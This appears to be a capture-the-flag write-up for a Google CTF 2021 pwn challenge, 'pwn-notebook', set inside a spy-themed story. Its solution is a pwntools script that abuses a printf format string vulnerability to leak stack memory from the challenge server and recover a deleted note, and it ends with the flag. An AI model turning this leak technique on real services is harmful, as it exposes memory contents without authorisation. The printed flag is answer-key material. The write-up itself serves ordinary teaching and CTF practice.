[../](../)

# Heathrow - Secret Warehouse

> Wow, it’s a crowded day at Heathrow, lots of suits that bump into each other and try to catch their plane. You have to find the gate to the secret warehouse, it cannot be far away. You see a suspicious suit go into a fast food court and you spot him disappear behind the checkout. Hmmm, odd?! You follow, and when no one sees you follow him. You go through a desolated kitchen, it stinks, you cover your nose with the back of your hand. You pass through a small entrance, and enter the secret warehouse, wow, it’s vast!

## Challenge: pwn-notebook (pwn)

> Please help me restore my deleted note.

> https://storage.googleapis.com/gctf-2021-attachments-project/6c96641ce301c1cce0638c706ce6f08e03dd07a7206f13502814948b87956797cbfab4e5319df21bc2bed99834bd7aede661f86a8a0d5c7148c3158d566afc68

> pwn-notebook.2021.ctfcompetition.com 1337

## Solution

You are given a `notebook` binary and your task is to read a message that is flagged as deleted but still remains in memory.
The binary is vulnerable to format strings as user-specified input is directly passed to `printf` which allows to leak memory contents.

The following code reads the memory contents at the respective offset of the deleted message.

```python
from pwn import *

r = remote("pwn-notebook.2021.ctfcompetition.com", 1337)
print(r.recv())
print(r.recv())

for i in range(365, 440):
    r.sendline("3")
    r.sendline("%{}$llx".format(i))
    data = r.recv().decode("utf-8")
    for line in data.splitlines():
        if line.startswith("<"):
            try:
                print(bytearray.fromhex(line.split()[1]).decode()[::-1])
            except:
                pass
```

flag: `CTF{format_string_for_the_win}`

> This place feels shady, it’s almost empty, besides from a guy that stands leaning against a couple of crates in the distance, he looks slim in an unhealthy way and smokes. PLING! You got a text message from your boss, that reads: "Greetings AGENT, I’ve been informed about your so far successful journeys. When you get to the warehouse, find a crate that says: "新加坡人", hide in it and you will be transported to your next destination - Singapore! Keep up the good work." At first you’re reluctant to enter a box, and hope to get transported across the world in it, but you don’t have that much of a choice, do you? You sneak past the slender chainsmoker, find the box and enter it.